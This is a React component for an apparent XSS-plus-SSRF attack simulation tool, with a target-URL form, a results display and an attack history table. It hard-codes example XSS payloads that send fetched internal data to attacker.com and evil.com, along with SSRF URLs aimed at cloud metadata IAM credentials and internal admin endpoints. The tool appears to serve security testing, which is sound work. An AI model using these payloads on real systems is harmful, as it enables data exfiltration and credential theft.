import React, { useState } from 'react';
import { Card, Form, Input, Button, Alert, Table, Tag, Space, Steps } from 'antd';
import { LinkOutlined } from '@ant-design/icons';
import { simulateCombinedAttack, getCombinedAttackHistory } from '../services/api';
import { Attack } from '../types/attack';

const { TextArea } = Input;
const { Step } = Steps;

const CombinedAttack: React.FC = () => {
  const [form] = Form.useForm();
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<Attack | null>(null);
  const [history, setHistory] = useState<Attack[]>([]);

  const handleSubmit = async (values: any) => {
    setLoading(true);
    try {
      const response = await simulateCombinedAttack({
        ...values,
        userId: '123' // 临时使用固定用户ID
      });
      setResult(response);
      // 刷新历史记录
      const historyData = await getCombinedAttackHistory();
      setHistory(historyData);
    } catch (error) {
      console.error('Combined attack simulation failed:', error);
    } finally {
      setLoading(false);
    }
  };

  const columns = [
    {
      title: '时间',
      dataIndex: 'timestamp',
      key: 'timestamp',
      render: (text: string) => new Date(text).toLocaleString()
    },
    {
      title: '目标URL',
      dataIndex: 'targetUrl',
      key: 'targetUrl'
    },
    {
      title: 'XSS Payload',
      dataIndex: 'payload',
      key: 'xssPayload',
      ellipsis: true,
      render: (payload: string) => {
        try {
          const { xss } = JSON.parse(payload);
          return xss;
        } catch {
          return payload;
        }
      }
    },
    {
      title: 'SSRF Payload',
      dataIndex: 'payload',
      key: 'ssrfPayload',
      ellipsis: true,
      render: (payload: string) => {
        try {
          const { ssrf } = JSON.parse(payload);
          return ssrf;
        } catch {
          return payload;
        }
      }
    },
    {
      title: '状态',
      dataIndex: 'status',
      key: 'status',
      render: (status: string) => (
        <Tag color={
          status === 'COMPLETED' ? 'green' :
          status === 'FAILED' ? 'red' :
          status === 'RUNNING' ? 'blue' : 'default'
        }>
          {status}
        </Tag>
      )
    },
    {
      title: '结果',
      dataIndex: 'result',
      key: 'result',
      render: (result: any) => (
        <Tag color={result.success ? 'green' : 'red'}>
          {result.success ? '成功' : '失败'}
        </Tag>
      )
    }
  ];

  const xssPayloadExamples = [
    '<script>fetch("http://internal-api/data").then(r=>r.json()).then(d=>fetch("http://attacker.com/collect",{method:"POST",body:JSON.stringify(d)}))</script>',
    '<img src=x onerror="fetch(\'http://internal.example.com\').then(r=>r.text()).then(t=>location=\'http://attacker.com/\'+btoa(t))">',
    '<svg onload="fetch(\'/api/secret\').then(r=>r.text()).then(t=>new Image().src=\'http://evil.com/\'+t)">'
  ];

  const ssrfPayloadExamples = [
    'http://internal-api/admin/users',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin',
    'http://localhost:8080/management/env'
  ];

  return (
    <div>
      <Card title={<><LinkOutlined /> XSS+SSRF联合攻击模拟</>} style={{ marginBottom: 24 }}>
        <Steps style={{ marginBottom: 24 }} current={-1}>
          <Step title="步骤 1" description="注入XSS Payload" />
          <Step title="步骤 2" description="触发SSRF请求" />
          <Step title="步骤 3" description="获取内部数据" />
        </Steps>

        <Form
          form={form}
          layout="vertical"
          onFinish={handleSubmit}
        >
          <Form.Item
            label="目标URL"
            name="targetUrl"
            rules={[{ required: true, message: '请输入目标URL' }]}
          >
            <Input placeholder="http://example.com" />
          </Form.Item>

          <Form.Item
            label="XSS Payload"
            name="xssPayload"
            rules={[{ required: true, message: '请输入XSS payload' }]}
          >
            <TextArea
              rows={4}
              placeholder="输入XSS payload"
            />
          </Form.Item>

          <Form.Item
            label="SSRF Payload"
            name="ssrfPayload"
            rules={[{ required: true, message: '请输入SSRF payload' }]}
          >
            <TextArea
              rows={4}
              placeholder="输入SSRF payload"
            />
          </Form.Item>

          <Form.Item>
            <Space direction="vertical" style={{ width: '100%' }}>
              <Button type="primary" htmlType="submit" loading={loading} block>
                开始联合攻击
              </Button>
              <div>
                <p>XSS Payload示例：</p>
                {xssPayloadExamples.map((example, index) => (
                  <Tag
                    key={index}
                    style={{ cursor: 'pointer', margin: '4px' }}
                    onClick={() => form.setFieldsValue({ xssPayload: example })}
                  >
                    {example}
                  </Tag>
                ))}
              </div>
              <div>
                <p>SSRF Payload示例：</p>
                {ssrfPayloadExamples.map((example, index) => (
                  <Tag
                    key={index}
                    style={{ cursor: 'pointer', margin: '4px' }}
                    onClick={() => form.setFieldsValue({ ssrfPayload: example })}
                  >
                    {example}
                  </Tag>
                ))}
              </div>
            </Space>
          </Form.Item>
        </Form>

        {result && (
          <Alert
            message={result.result.success ? "攻击成功" : "攻击失败"}
            description={
              <div>
                <p>详细信息：</p>
                <pre>
                  {JSON.stringify(result.result.data, null, 2)}
                </pre>
              </div>
            }
            type={result.result.success ? "success" : "error"}
            showIcon
          />
        )}
      </Card>

      <Card title="攻击历史记录">
        <Table
          columns={columns}
          dataSource={history}
          rowKey="_id"
          pagination={{ pageSize: 5 }}
        />
      </Card>
    </div>
  );
};

export default CombinedAttack; 